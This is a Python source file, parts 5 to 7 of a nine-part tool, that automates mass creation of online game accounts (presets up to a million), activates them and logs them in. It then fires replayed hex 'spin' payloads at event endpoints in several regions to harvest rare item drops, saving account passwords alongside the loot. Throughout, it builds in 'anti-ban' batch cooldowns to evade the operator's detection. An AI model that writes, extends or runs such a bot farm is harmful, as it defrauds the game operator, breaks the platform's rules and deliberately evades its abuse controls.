def save_event_result(entry: dict, event_name: str) -> None:
    safe_name = re.sub(r'[^a-zA-Z0-9_\-]', '_', event_name)
    path = os.path.join(EVENTS_FOLDER, f"{safe_name}.json")
    enqueue_write(path, entry)


def save_special_result(entry: dict, event_name: str) -> None:
    safe_name = re.sub(r'[^a-zA-Z0-9_\-]', '_', event_name)
    path = os.path.join(RESULT_FOLDER, f"rare_{safe_name}.json")
    enqueue_write(path, entry)


# ══════════════════════════════════════════════════════════════════════════
#  FORMAT HELPERS
# ══════════════════════════════════════════════════════════════════════════

def _fmt_progress(slot: int, total: int) -> str:
    return f"{NEXUS.GOLD}[{slot}/{total}]{NEXUS.RESET}"


def _fmt_event(region: str, event_key: str) -> str:
    return f"{NEXUS.GOLD}[{region}{NEXUS.STEEL}-{NEXUS.CORAL}{event_key}{NEXUS.GOLD}]{NEXUS.RESET}"


def _fmt_uid(uid: str) -> str:
    return f"{NEXUS.CYAN}UID:{NEXUS.BOLD}{uid[:16]}{NEXUS.RESET}"


# ══════════════════════════════════════════════════════════════════════════
#  SINGLE ACCOUNT PROCESSOR (5 events + fresh JWT per event)
# ══════════════════════════════════════════════════════════════════════════

async def process_single_account(
    session: aiohttp.ClientSession,
    slot: int,
    account: dict,
    total_accounts: int,
    region: str,
    events_to_run: list,
    semaphore: asyncio.Semaphore,
    stats: LiveStats,
    proxy=None,
):
    """
    Process ONE account across all 5 events.
    Uses ONE JWT for all events. Only re-login on HTTP 401.
    """
    async with semaphore:
        uid = str(account.get("uid", "?")).strip()
        pwd = str(account.get("password", "?")).strip()

        if not uid or not pwd:
            stats.inc_account()
            return

        # ═══ Single login for whole account ═══
        login_result = await full_login_async(session, uid, pwd, proxy)

        if not login_result.success:
            stats.inc_login_fail()
            stats.inc_account()
            _safe_print(
                f"{_ts()} {NEXUS.GOLD}🎰{NEXUS.RESET} "
                f"{_fmt_progress(slot, total_accounts)} "
                f"{NEXUS.GOLD}[{region}]{NEXUS.RESET} "
                f"{_fmt_uid(uid)} {NEXUS.STEEL}→{NEXUS.RESET} "
                f"{NEXUS.RED}✖ Login Failed ({login_result.error}){NEXUS.RESET}"
            )
            return

        stats.inc_login_ok()
        jwt = login_result.jwt

        # ═══ Loop through all events with SAME JWT ═══
        for event_key in events_to_run:
            if event_key not in EVENTS_DATA:
                continue

            event = EVENTS_DATA[event_key]
            payload_hex = event["payloads"].get(region.upper(), "").strip()

            if not payload_hex or not is_valid_payload(payload_hex):
                stats.inc_spin_fail()
                stats.record_event(event_key, success=False)
                stats.record_region(region, success=False)
                _safe_print(
                    f"{_ts()} {NEXUS.GOLD}🎰{NEXUS.RESET} "
                    f"{_fmt_progress(slot, total_accounts)} "
                    f"{_fmt_event(region, event_key)} "
                    f"{_fmt_uid(uid)} {NEXUS.STEEL}→{NEXUS.RESET} "
                    f"{NEXUS.YELLOW}⚠ No Payload{NEXUS.RESET}"
                )
                await asyncio.sleep(Config.PACE_BETWEEN_EVENTS)
                continue

            # ═══ Spin with CURRENT JWT ═══
            status, body = await send_spin_request_async(
                session, region, jwt, payload_hex, proxy
            )

            # ═══ If HTTP 401 → re-login once ═══
            if status == 401:
                _safe_print(
                    f"{_ts()} {NEXUS.YELLOW}🔄{NEXUS.RESET} "
                    f"{_fmt_event(region, event_key)} "
                    f"{_fmt_uid(uid)} {NEXUS.STEEL}→{NEXUS.RESET} "
                    f"{NEXUS.AMBER}JWT expired, re-login...{NEXUS.RESET}"
                )
                retry_login = await full_login_async(session, uid, pwd, proxy)
                if retry_login.success:
                    jwt = retry_login.jwt
                    status, body = await send_spin_request_async(
                        session, region, jwt, payload_hex, proxy
                    )

            if status != 200:
                stats.inc_spin_fail()
                stats.record_event(event_key, success=False)
                stats.record_region(region, success=False)
                _safe_print(
                    f"{_ts()} {NEXUS.GOLD}🎰{NEXUS.RESET} "
                    f"{_fmt_progress(slot, total_accounts)} "
                    f"{_fmt_event(region, event_key)} "
                    f"{_fmt_uid(uid)} {NEXUS.STEEL}→{NEXUS.RESET} "
                    f"{NEXUS.RED}✖ HTTP {status}{NEXUS.RESET}"
                )
                await asyncio.sleep(Config.PACE_BETWEEN_EVENTS)
                continue

            # ═══ Parse ═══
            ok, item_id, item_name = parse_spin_response(body)

            if not ok or item_id is None:
                stats.inc_spin_fail()
                stats.record_event(event_key, success=False)
                stats.record_region(region, success=False)
                _safe_print(
                    f"{_ts()} {NEXUS.GOLD}🎰{NEXUS.RESET} "
                    f"{_fmt_progress(slot, total_accounts)} "
                    f"{_fmt_event(region, event_key)} "
                    f"{_fmt_uid(uid)} {NEXUS.STEEL}→{NEXUS.RESET} "
                    f"{NEXUS.ORANGE}⚠ Null Item{NEXUS.RESET}"
                )
                await asyncio.sleep(Config.PACE_BETWEEN_EVENTS)
                continue

            # ═══ Success! ═══
            stats.inc_spin_ok()
            stats.record_region(region, success=True)

            entry = _build_result_entry(
                uid, pwd, item_id, item_name,
                region, event_key, "internal"
            )
            save_all_result(entry)
            save_event_result(entry, event_key)

            # ═══ Rare check ═══
            is_rare, rare_name, rare_event = is_ind_item_rare(item_id)

            if is_rare:
                stats.inc_special()
                stats.record_event(event_key, success=True, is_special=True)
                stats.record_region(region, success=True, is_special=True)
                stats.add_rare(uid, rare_name, event_key)
                stats.add_drop(f"{rare_name} → {uid[:10]}")

                save_special_result(entry, event_key)

                show_congratulations(
                    idx=slot,
                    uid=uid,
                    pwd=pwd,
                    item_name=rare_name,
                    event_name=event_key,
                    region=region,
                )
            else:
                stats.record_event(event_key, success=True)
                show_ghanta_mila(
                    idx=slot,
                    uid=uid,
                    item_name=item_name,
                    event_name=event_key,
                )

            await asyncio.sleep(Config.PACE_BETWEEN_EVENTS)

        stats.inc_account()




# ══════════════════════════════════════════════════════════════════════════
#  WORKER BATCH
# ══════════════════════════════════════════════════════════════════════════

async def worker_batch(
    session: aiohttp.ClientSession,
    accounts: list,
    start_slot: int,
    total_accounts: int,
    region: str,
    events_to_run: list,
    semaphore: asyncio.Semaphore,
    stats: LiveStats,
    worker_id: int = 0,
):
    """Process batch of accounts sequentially"""
    for i, account in enumerate(accounts):
        slot = start_slot + i
        try:
            await process_single_account(
                session=session,
                slot=slot,
                account=account,
                total_accounts=total_accounts,
                region=region,
                events_to_run=events_to_run,
                semaphore=semaphore,
                stats=stats,
                proxy=None,
            )
        except asyncio.CancelledError:
            raise
        except Exception as e:
            log_error_to_file(str(e), f"worker_batch[w{worker_id}]")
            _safe_print(f"{NEXUS.RED}[WORKER-{worker_id}] Error: {e}{NEXUS.RESET}")


# ══════════════════════════════════════════════════════════════════════════
#  STOP CONTROL
# ══════════════════════════════════════════════════════════════════════════
_STOP_FLAG = threading.Event()


def request_stop():
    _STOP_FLAG.set()


def clear_stop():
    _STOP_FLAG.clear()


def is_stopped() -> bool:
    return _STOP_FLAG.is_set()


def install_keyboard_handler():
    """Install Ctrl+C handler for graceful shutdown"""
    try:
        def handler(signum, frame):
            if not is_stopped():
                log_warn("Stop requested — finishing current batch...")
                request_stop()
            else:
                log_err("Force exit!")
                sys.exit(1)

        signal.signal(signal.SIGINT, handler)
        if hasattr(signal, "SIGTERM"):
            signal.signal(signal.SIGTERM, handler)
    except Exception:
        pass


# ══════════════════════════════════════════════════════════════════════════
#  SPINNER ENGINE (main)
# ══════════════════════════════════════════════════════════════════════════

async def run_spinner_engine(
    accounts: list,
    region: str,
    events_to_run: list = None,
    workers: int = 16,
    batch_size: int = 10,
) -> LiveStats:
    """
    Main spinner engine.
    Returns: LiveStats object for dashboard
    """
    if events_to_run is None:
        events_to_run = [k for k, v in EVENTS_DATA.items() if v.get("enabled", True)]

    total_accounts = len(accounts)
    if total_accounts == 0:
        log_err("No accounts to process")
        return LiveStats(0, 0)

    total_spins = total_accounts * len(events_to_run)

    log_angel(f"Spinner starting: {total_accounts} accounts × {len(events_to_run)} events = {total_spins} spins")
    log_info(f"Workers: {workers} | Batch: {batch_size} | Region: {region}")

    stats = LiveStats(total_accounts, total_spins)
    semaphore = asyncio.Semaphore(workers)

    connector = build_async_connector()
    timeout = build_async_timeout()

    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        # Progress printer
        async def progress_printer():
            while not is_stopped():
                await asyncio.sleep(5)
                if stats.should_print(5.0):
                    snap = stats.snapshot()
                    _safe_print(
                        f"{_ts()} {NEXUS.CYAN}📊 "
                        f"Progress: {snap['completed']}/{total_accounts} "
                        f"({snap['progress']:.1f}%) | "
                        f"OK: {snap['spins_done']} | "
                        f"FAIL: {snap['spins_failed']} | "
                        f"RARE: {snap['specials']} | "
                        f"Rate: {snap['rate']:.2f}/s{NEXUS.RESET}"
                    )

        progress_task = asyncio.create_task(progress_printer())

        try:
            for batch_start in range(0, total_accounts, batch_size):
                if is_stopped():
                    log_warn("Stop flag set — breaking batch loop")
                    break

                batch = accounts[batch_start:batch_start + batch_size]
                batch_end = batch_start + len(batch)
                batch_num = (batch_start // batch_size) + 1
                total_batches = (total_accounts + batch_size - 1) // batch_size

                _safe_print(
                    f"\n{NEXUS.GOLD}{'═' * 64}{NEXUS.RESET}\n"
                    f"{NEXUS.BOLD}{NEXUS.YELLOW}  📦 BATCH {batch_num}/{total_batches} "
                    f"({len(batch)} accounts){NEXUS.RESET}\n"
                    f"{NEXUS.GOLD}{'═' * 64}{NEXUS.RESET}\n"
                )

                tasks = [
                    worker_batch(
                        session=session,
                        accounts=[acc],
                        start_slot=batch_start + i + 1,
                        total_accounts=total_accounts,
                        region=region,
                        events_to_run=events_to_run,
                        semaphore=semaphore,
                        stats=stats,
                        worker_id=i + 1,
                    )
                    for i, acc in enumerate(batch)
                ]

                try:
                    results = await asyncio.gather(*tasks, return_exceptions=True)
                    for i, r in enumerate(results):
                        if isinstance(r, Exception):
                            _safe_print(
                                f"{NEXUS.RED}[EXCEPTION] Task {i}: "
                                f"{type(r).__name__}: {r}{NEXUS.RESET}"
                            )
                except Exception as e:
                    _safe_print(f"{NEXUS.RED}[BATCH ERROR] {e}{NEXUS.RESET}")

                if batch_end < total_accounts:
                    cooldown = ANTI_BAN.get("batch_cooldown", 30.0)
                    _safe_print(
                        f"{NEXUS.GOLD}⏳ Batch cooldown: {cooldown:.0f}s...{NEXUS.RESET}\n"
                    )
                    await asyncio.sleep(cooldown)

        except asyncio.CancelledError:
            log_warn("Engine cancelled by user")
            raise

        finally:
            progress_task.cancel()
            try:
                await progress_task
            except (asyncio.CancelledError, Exception):
                pass

            save_final_data()

            global TOTAL_SPINS, TOTAL_SPECIAL, TOTAL_ERRORS
            TOTAL_SPINS = stats.spins_done
            TOTAL_SPECIAL = stats.specials
            TOTAL_ERRORS = stats.spins_failed

            return stats


# ══════════════════════════════════════════════════════════════════════════
#  SYNC WRAPPER
# ══════════════════════════════════════════════════════════════════════════

def run_async_spinner(
    accounts: list,
    region: str,
    events_to_run: list = None,
    workers: int = 16,
    batch_size: int = 10,
) -> Optional[LiveStats]:
    """Sync wrapper for async spinner"""
    if events_to_run is None:
        events_to_run = [k for k, v in EVENTS_DATA.items() if v.get("enabled", True)]

    try:
        try:
            loop = asyncio.get_running_loop()
            return loop.create_task(
                run_spinner_engine(accounts, region, events_to_run, workers, batch_size)
            )
        except RuntimeError:
            return asyncio.run(
                run_spinner_engine(accounts, region, events_to_run, workers, batch_size)
            )
    except KeyboardInterrupt:
        log_warn("Interrupted by user")
        save_final_data()
        return None
    except Exception as e:
        log_err(f"Engine error: {e}")
        log_error_to_file(str(e), "run_async_spinner")
        save_final_data()
        return None


# ══════════════════════════════════════════════════════════════════════════
#  END OF PART 5 of 9
# ══════════════════════════════════════════════════════════════════════════
# ══════════════════════════════════════════════════════════════════════════
#  PART 6 — FULL PIPELINE, PIPELINE RUNNER, MENU HELPERS
# ══════════════════════════════════════════════════════════════════════════


# ══════════════════════════════════════════════════════════════════════════
#  PIPELINE — Full Auto per Account (Gen → Act → Spin 5 events)
# ══════════════════════════════════════════════════════════════════════════

async def pipeline_process_account(
    session: aiohttp.ClientSession,
    slot: int,
    total_accounts: int,
    region: str,
    events_to_run: list,
    semaphore: asyncio.Semaphore,
    stats: LiveStats,
    prefix: str = "ANGEL",
    proxy=None,
    generate_only: bool = False,
    activate_only: bool = False,
    spin_only: bool = False,
    pre_account: dict = None,
):
    """
    Full pipeline for ONE account:
    Generate → Activate → Spin 5 Events

    OR use flags to do only part:
    - generate_only: Only generate + save
    - activate_only: Only activate existing account
    - spin_only: Only spin 5 events (needs pre_account)
    """
    async with semaphore:
        loop = asyncio.get_event_loop()

        # ═══ STEP 1: GENERATE ═══
        if not spin_only and not activate_only:
            try:
                acc = await loop.run_in_executor(
                    None,
                    lambda: AccountGenerator.create_one(region, prefix, session=None)
                )
            except Exception as e:
                log_error_to_file(str(e), "pipeline_generate")
                acc = None

            if not acc:
                stats.inc_account()
                _safe_print(
                    f"{_ts()} {NEXUS.GOLD}🎮{NEXUS.RESET} "
                    f"{NEXUS.GOLD}[{slot}/{total_accounts}]{NEXUS.RESET} "
                    f"{NEXUS.RED}✖ Generation failed{NEXUS.RESET}"
                )
                return

            # Show account box
            UI.account_card(slot, total_accounts, acc)

            if generate_only:
                stats.inc_account()
                return

        elif activate_only:
            acc = pre_account
            if not acc:
                stats.inc_account()
                return
        else:
            acc = pre_account or {}

        # ═══ STEP 2: ACTIVATE (skip if already activated in gen) ═══
        if not spin_only and not generate_only:
            if not acc.get("activated", False):
                try:
                    ok_act, status, online, chat = await loop.run_in_executor(
                        None,
                        lambda: (
                            lambda r: (r["activated"], r["status"],
                                       r.get("message", "")[:80], r.get("message", "")[:80])
                        )(ActivationEngine.activate(
                            str(acc.get("uid", "")),
                            str(acc.get("password", "")),
                            acc=acc,
                            session=None,
                        ))
                    )
                except Exception as e:
                    log_error_to_file(str(e), "pipeline_activate")
                    ok_act = False
                    status = "exception"
                    online = ""

                if ok_act:
                    acc["activated"] = True
                    acc["activation_status"] = status
                    acc["activation_message"] = online or "Activated"
                    log_act(f"[{slot}/{total_accounts}] ✅ Activated → {online}")

                    if activate_only:
                        stats.inc_account()
                        return
                else:
                    log_err(f"[{slot}/{total_accounts}] ✖ Activation failed ({status})")
                    stats.inc_account()
                    return
            else:
                log_act(f"[{slot}/{total_accounts}] ✅ Already activated")

        # ═══ STEP 3: SPIN 5 EVENTS ═══
        try:
            await process_single_account(
                session=session,
                slot=slot,
                account=acc,
                total_accounts=total_accounts,
                region=region,
                events_to_run=events_to_run,
                semaphore=asyncio.Semaphore(1),
                stats=stats,
                proxy=proxy,
            )
        except Exception as e:
            log_error_to_file(str(e), "pipeline_spin")
            stats.inc_account()


# ══════════════════════════════════════════════════════════════════════════
#  FULL PIPELINE RUNNER
# ══════════════════════════════════════════════════════════════════════════

async def run_full_pipeline(
    total_accounts: int,
    region: str,
    events_to_run: list,
    workers: int = 16,
    batch_size: int = 10,
    prefix: str = "ANGEL",
    generate_only: bool = False,
    activate_only: bool = False,
) -> LiveStats:
    """
    Full pipeline: For each account slot, run Gen → Act → Spin.
    Returns: LiveStats
    """
    total_spins = total_accounts * len(events_to_run)

    log_angel(f"🚀 FULL PIPELINE STARTING")
    log_info(f"Accounts: {total_accounts} | Events: {len(events_to_run)} | Workers: {workers}")
    log_info(f"Region: {region} | Prefix: {prefix}")
    mode_str = "GEN ONLY" if generate_only else ("ACT ONLY" if activate_only else "FULL")
    log_info(f"Mode: {mode_str}")

    stats = LiveStats(total_accounts, total_spins)
    semaphore = asyncio.Semaphore(workers)

    connector = build_async_connector()
    timeout = build_async_timeout()

    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        # Progress printer
        async def progress_printer():
            while not is_stopped():
                await asyncio.sleep(5)
                if stats.should_print(5.0):
                    snap = stats.snapshot()
                    _safe_print(
                        f"{_ts()} {NEXUS.CYAN}📊 "
                        f"Progress: {snap['completed']}/{total_accounts} "
                        f"({snap['progress']:.1f}%) | "
                        f"OK: {snap['spins_done']} | "
                        f"FAIL: {snap['spins_failed']} | "
                        f"RARE: {snap['specials']} | "
                        f"Rate: {snap['rate']:.2f}/s{NEXUS.RESET}"
                    )

        progress_task = asyncio.create_task(progress_printer())

        try:
            for batch_start in range(0, total_accounts, batch_size):
                if is_stopped():
                    log_warn("Stop flag set — breaking batch loop")
                    break

                batch_end = min(batch_start + batch_size, total_accounts)
                batch_count = batch_end - batch_start
                batch_num = (batch_start // batch_size) + 1
                total_batches = (total_accounts + batch_size - 1) // batch_size

                _safe_print(
                    f"\n{NEXUS.GOLD}{'═' * 64}{NEXUS.RESET}\n"
                    f"{NEXUS.BOLD}{NEXUS.YELLOW}  📦 BATCH {batch_num}/{total_batches} "
                    f"({batch_count} accounts){NEXUS.RESET}\n"
                    f"{NEXUS.GOLD}{'═' * 64}{NEXUS.RESET}\n"
                )

                # Create tasks
                tasks = []
                for i in range(batch_count):
                    slot = batch_start + i + 1

                    task = pipeline_process_account(
                        session=session,
                        slot=slot,
                        total_accounts=total_accounts,
                        region=region,
                        events_to_run=events_to_run,
                        semaphore=semaphore,
                        stats=stats,
                        prefix=prefix,
                        generate_only=generate_only,
                        activate_only=activate_only,
                    )
                    tasks.append(task)

                # Wait for batch
                try:
                    results = await asyncio.gather(*tasks, return_exceptions=True)
                    for i, r in enumerate(results):
                        if isinstance(r, Exception):
                            _safe_print(
                                f"{NEXUS.RED}[EXCEPTION] Task {i}: "
                                f"{type(r).__name__}: {r}{NEXUS.RESET}"
                            )
                except Exception as e:
                    _safe_print(f"{NEXUS.RED}[BATCH ERROR] {e}{NEXUS.RESET}")

                # Cooldown
                if batch_end < total_accounts:
                    cooldown = ANTI_BAN.get("batch_cooldown", 30.0)
                    _safe_print(
                        f"{NEXUS.GOLD}⏳ Batch cooldown: {cooldown:.0f}s...{NEXUS.RESET}\n"
                    )
                    await asyncio.sleep(cooldown)

        except asyncio.CancelledError:
            log_warn("Pipeline cancelled")
            raise

        finally:
            progress_task.cancel()
            try:
                await progress_task
            except (asyncio.CancelledError, Exception):
                pass

            # Flush
            save_final_data()
            save_csv()

            # Update globals
            global TOTAL_SPINS, TOTAL_SPECIAL, TOTAL_ERRORS
            global TOTAL_GENERATED, TOTAL_ACTIVATED
            TOTAL_SPINS = stats.spins_done
            TOTAL_SPECIAL = stats.specials
            TOTAL_ERRORS = stats.spins_failed
            TOTAL_GENERATED = state.success_count
            TOTAL_ACTIVATED = state.activated_count

            return stats


def run_full_pipeline_sync(
    total_accounts: int,
    region: str,
    events_to_run: list,
    workers: int = 16,
    batch_size: int = 10,
    prefix: str = "ANGEL",
    generate_only: bool = False,
    activate_only: bool = False,
) -> Optional[LiveStats]:
    """Sync wrapper for full pipeline"""
    try:
        return asyncio.run(
            run_full_pipeline(
                total_accounts=total_accounts,
                region=region,
                events_to_run=events_to_run,
                workers=workers,
                batch_size=batch_size,
                prefix=prefix,
                generate_only=generate_only,
                activate_only=activate_only,
            )
        )
    except KeyboardInterrupt:
        log_warn("Interrupted")
        save_final_data()
        save_csv()
        return None
    except Exception as e:
        log_err(f"Pipeline error: {e}")
        log_error_to_file(str(e), "run_full_pipeline_sync")
        save_final_data()
        save_csv()
        return None


# ══════════════════════════════════════════════════════════════════════════
#  CONFIG SUMMARY
# ══════════════════════════════════════════════════════════════════════════

def show_config_summary(
    total_accounts: int,
    region: str,
    events: list,
    workers: int,
    batch_size: int,
    prefix: str = "ANGEL",
):
    """Display final config before running"""
    total_spins = total_accounts * len(events)

    event_names = ", ".join([
        EVENTS_DATA[e].get("display_name", e).split(" ", 1)[-1]
        for e in events[:3]
    ])
    if len(events) > 3:
        event_names += f" + {len(events) - 3} more"

    w = min(Term.width(), 96)
    rows = [
        Term.kv("Accounts",  f"{NEXUS.GREEN}{total_accounts:,}{NEXUS.RESET}", NEXUS.SILVER, NEXUS.WHITE),
        Term.kv("Region",    f"{NEXUS.MAGENTA}{region}{NEXUS.RESET}", NEXUS.SILVER, NEXUS.WHITE),
        Term.kv("Events",    f"{NEXUS.CYAN}{len(events)}{NEXUS.RESET}  {NEXUS.STEEL}({event_names}){NEXUS.RESET}", NEXUS.SILVER, NEXUS.WHITE),
        Term.kv("Total Spins", f"{NEXUS.GOLD}{NEXUS.BOLD}{total_spins:,}{NEXUS.RESET}", NEXUS.SILVER, NEXUS.WHITE),
        Term.kv("Workers",   f"{NEXUS.CYAN}{workers}{NEXUS.RESET}", NEXUS.SILVER, NEXUS.WHITE),
        Term.kv("Batch Size", f"{NEXUS.CYAN}{batch_size}{NEXUS.RESET}", NEXUS.SILVER, NEXUS.WHITE),
        Term.kv("Prefix",    f"{NEXUS.GREEN}{prefix}{NEXUS.RESET}", NEXUS.SILVER, NEXUS.WHITE),
        Term.kv("Anti-Ban",  f"{NEXUS.LIME}ENABLED{NEXUS.RESET}", NEXUS.SILVER, NEXUS.WHITE),
        Term.kv("Flow",      f"{NEXUS.GOLD}GEN → ACT → SPIN 5{NEXUS.RESET}", NEXUS.SILVER, NEXUS.WHITE),
        Term.kv("Output",    f"{NEXUS.STEEL}{os.path.basename(RESULT_FOLDER)}/{NEXUS.RESET}", NEXUS.SILVER, NEXUS.WHITE),
    ]
    print()
    Term.box("FINAL CONFIGURATION", rows, NEXUS.CYAN, w, NEXUS.GOLD)
    print()


# ══════════════════════════════════════════════════════════════════════════
#  STOP CONTROL (global — used by pipeline + spinner)
# ══════════════════════════════════════════════════════════════════════════

def install_pipeline_keyboard_handler():
    """Install Ctrl+C handler for pipeline"""
    try:
        def handler(signum, frame):
            if not is_stopped():
                log_warn("Stop requested — finishing current batch...")
                request_stop()
            else:
                log_err("Force exit!")
                sys.exit(1)

        signal.signal(signal.SIGINT, handler)
        if hasattr(signal, "SIGTERM"):
            signal.signal(signal.SIGTERM, handler)
    except Exception:
        pass


# ══════════════════════════════════════════════════════════════════════════
#  SAFE CLEANUP
# ══════════════════════════════════════════════════════════════════════════

def _safe_cleanup():
    """Safe cleanup — flush saves, close all writers"""
    try:
        save_final_data()
    except Exception:
        pass

    try:
        save_csv()
    except Exception:
        pass


# ══════════════════════════════════════════════════════════════════════════
#  END OF PART 6 of 9
# ══════════════════════════════════════════════════════════════════════════
# ══════════════════════════════════════════════════════════════════════════
#  PART 7 — DASHBOARD, PRESETS, REGION, MENUS
# ══════════════════════════════════════════════════════════════════════════


# ══════════════════════════════════════════════════════════════════════════
#  SAFE INPUT HELPERS
# ══════════════════════════════════════════════════════════════════════════

def ask_input(prompt: str, default: str = None, color: str = None, allow_empty: bool = False) -> str:
    """Safe input with default"""
    if color is None:
        color = NEXUS.CYAN

    default_str = f" {NEXUS.STEEL}[{NEXUS.GOLD}{default}{NEXUS.STEEL}]{NEXUS.RESET}" if default else ""
    full_prompt = (
        f"  {NEXUS.GOLD}┌─╼⟦{NEXUS.CORAL}?{NEXUS.GOLD}⟧ {NEXUS.YELLOW}{prompt}{NEXUS.RESET}{default_str}\n"
        f"  {NEXUS.GOLD}└──╼❯ {color}{NEXUS.BOLD}"
    )

    try:
        val = input(full_prompt).strip()
        print(NEXUS.RESET, end="")
        if not val:
            if default is not None:
                return str(default)
            if allow_empty:
                return ""
            return ""
        return val
    except (EOFError, KeyboardInterrupt):
        print(NEXUS.RESET)
        return default if default is not None else ""


def ask_int(prompt: str, default: int = 0, min_val: int = 0,
            max_val: int = 999999999, color: str = None) -> int:
    """Safe integer input with bounds"""
    val = ask_input(prompt, str(default), color)
    try:
        n = int(val)
        return max(min_val, min(max_val, n))
    except (ValueError, TypeError):
        return default


def ask_yes_no(prompt: str, default: bool = True) -> bool:
    """Safe yes/no"""
    default_str = "Y/n" if default else "y/N"
    val = ask_input(prompt, default_str, NEXUS.LIME).strip().lower()
    if not val or val == default_str.lower():
        return default
    return val in ("y", "yes", "1", "true", "haan")


# ══════════════════════════════════════════════════════════════════════════
#  ACCOUNT COUNT PRESETS
# ══════════════════════════════════════════════════════════════════════════
ACCOUNT_PRESETS = {
    "1": 10,
    "2": 100,
    "3": 1000,
    "4": 10000,
    "5": 100000,
    "6": 1000000,
    "7": 0,        # Custom
}


def select_account_count() -> int:
    """Show account count preset menu"""
    print()
    print(f"  {NEXUS.BOLD}{gradient_text('📦 HOW MANY ACCOUNTS?', NEXUS.FIRE_FLOW, 0)}{NEXUS.RESET}")
    print()

    print(f"  {NEXUS.GOLD}╭{'─' * 56}╮{NEXUS.RESET}")

    options = [
        ("1", "10",        "🔟  Ten"),
        ("2", "100",       "💯  Hundred"),
        ("3", "1,000",     "🔢  One Thousand"),
        ("4", "10,000",    "🔢  Ten Thousand"),
        ("5", "100,000",   "🚀  Hundred Thousand"),
        ("6", "1,000,000", "💎  One Million"),
        ("7", "Custom",    "✏️   Type your own number"),
    ]

    for key, num, label in options:
        line = (
            f"  {NEXUS.GOLD}│{NEXUS.RESET} "
            f"{NEXUS.BOLD}{NEXUS.LIME}[{key}]{NEXUS.RESET}  "
            f"{NEXUS.BOLD}{NEXUS.YELLOW}{num:<14}{NEXUS.RESET} "
            f"{NEXUS.STEEL}{label}{NEXUS.RESET}"
        )
        vis = _vlen(line)
        pad = max(0, 58 - vis)
        print(line + " " * pad + f"{NEXUS.GOLD}│{NEXUS.RESET}")

    print(f"  {NEXUS.GOLD}╰{'─' * 56}╯{NEXUS.RESET}")
    print()

    while True:
        choice = ask_input("Choice (1-7)", "1", NEXUS.YELLOW).strip()

        if choice in ACCOUNT_PRESETS:
            preset_val = ACCOUNT_PRESETS[choice]
            if preset_val == 0:
                try:
                    custom = ask_int("Enter custom count (1 - 10,000,000)", 100, 1, 10000000, NEXUS.CYAN)
                    log_angel(f"Accounts to generate: {custom:,}")
                    return custom
                except Exception:
                    continue
            else:
                log_angel(f"Accounts to generate: {preset_val:,}")
                return preset_val

        log_warn("Invalid choice — try 1-7")


# ══════════════════════════════════════════════════════════════════════════
#  WORKER / THREADS PRESETS
# ══════════════════════════════════════════════════════════════════════════
WORKER_PRESETS = {
    "1": 10,
    "2": 25,
    "3": 50,
    "4": 100,
    "5": 150,
    "6": 0,        # Custom
}


def select_workers() -> int:
    """Show worker/threads preset menu"""
    print()
    print(f"  {NEXUS.BOLD}{gradient_text('🧵 HOW MANY WORKERS (THREADS)?', NEXUS.FIRE_FLOW, 0)}{NEXUS.RESET}")
    print()

    print(f"  {NEXUS.GOLD}╭{'─' * 56}╮{NEXUS.RESET}")

    options = [
        ("1", "10",     "⚡  Light (safe for weak devices)"),
        ("2", "25",     "⚡⚡  Normal"),
        ("3", "50",     "⚡⚡⚡  Fast (recommended)"),
        ("4", "100",    "🔥  Very Fast"),
        ("5", "150",    "🚀  Ultra Fast (max)"),
        ("6", "Custom", "✏️   Type your own number"),
    ]

    for key, num, label in options:
        line = (
            f"  {NEXUS.GOLD}│{NEXUS.RESET} "
            f"{NEXUS.BOLD}{NEXUS.LIME}[{key}]{NEXUS.RESET}  "
            f"{NEXUS.BOLD}{NEXUS.YELLOW}{num:<8}{NEXUS.RESET} "
            f"{NEXUS.STEEL}{label}{NEXUS.RESET}"
        )
        vis = _vlen(line)
        pad = max(0, 58 - vis)
        print(line + " " * pad + f"{NEXUS.GOLD}│{NEXUS.RESET}")

    print(f"  {NEXUS.GOLD}╰{'─' * 56}╯{NEXUS.RESET}")
    print()

    while True:
        choice = ask_input("Choice (1-6)", "3", NEXUS.YELLOW).strip()

        if choice in WORKER_PRESETS:
            preset_val = WORKER_PRESETS[choice]
            if preset_val == 0:
                try:
                    custom = ask_int("Enter custom workers (1 - 300)", 50, 1, 300, NEXUS.CYAN)
                    log_angel(f"Workers: {custom}")
                    return custom
                except Exception:
                    continue
            else:
                log_angel(f"Workers: {preset_val}")
                return preset_val

        log_warn("Invalid choice — try 1-6")


# ══════════════════════════════════════════════════════════════════════════
#  REGION SELECTION
# ══════════════════════════════════════════════════════════════════════════
REGION_MENU = {
    "1": {"code": "IND", "name": "INDIA",       "flag": "🇮🇳", "color": NEXUS.ORANGE},
    "2": {"code": "BD",  "name": "BANGLADESH",  "flag": "🇧🇩", "color": NEXUS.GREEN},
    "3": {"code": "PK",  "name": "PAKISTAN",    "flag": "🇵🇰", "color": NEXUS.EMERALD},
    "4": {"code": "SG",  "name": "SINGAPORE",   "flag": "🇸🇬", "color": NEXUS.ROSE},
    "5": {"code": "ID",  "name": "INDONESIA",   "flag": "🇮🇩", "color": NEXUS.RED},
    "6": {"code": "ME",  "name": "MIDDLE EAST", "flag": "🇲🇪", "color": NEXUS.GOLD},
}


def select_region() -> str:
    """Show region menu — IND default"""
    print()
    print(f"  {NEXUS.BOLD}{gradient_text('🌍 SELECT REGION', NEXUS.ANGEL_FLOW, 0)}{NEXUS.RESET}")
    print()

    print(f"  {NEXUS.GOLD}╭{'─' * 60}╮{NEXUS.RESET}")

    for key, info in REGION_MENU.items():
        code = info["code"]
        try:
            events_count = len(get_available_events(code))
        except Exception:
            events_count = 5

        line = (
            f"  {NEXUS.GOLD}│{NEXUS.RESET} "
            f"{NEXUS.BOLD}{NEXUS.CORAL}[{key}]{NEXUS.RESET}  "
            f"{info['flag']}  "
            f"{NEXUS.BOLD}{info['color']}{info['name']:<16}{NEXUS.RESET} "
            f"{NEXUS.STEEL}·{NEXUS.RESET} "
            f"{NEXUS.CYAN}{events_count} events{NEXUS.RESET}"
        )
        vis = _vlen(line)
        pad = max(0, 62 - vis)
        print(line + " " * pad + f"{NEXUS.GOLD}│{NEXUS.RESET}")

    print(f"  {NEXUS.GOLD}╰{'─' * 60}╯{NEXUS.RESET}")
    print()

    while True:
        choice = ask_input("Region (default IND)", "1", NEXUS.YELLOW).strip()
        if choice in REGION_MENU:
            region = REGION_MENU[choice]["code"]
            log_angel(f"Region locked: {REGION_MENU[choice]['name']}")
            return region
        log_warn("Invalid choice — try 1-6")


# ══════════════════════════════════════════════════════════════════════════
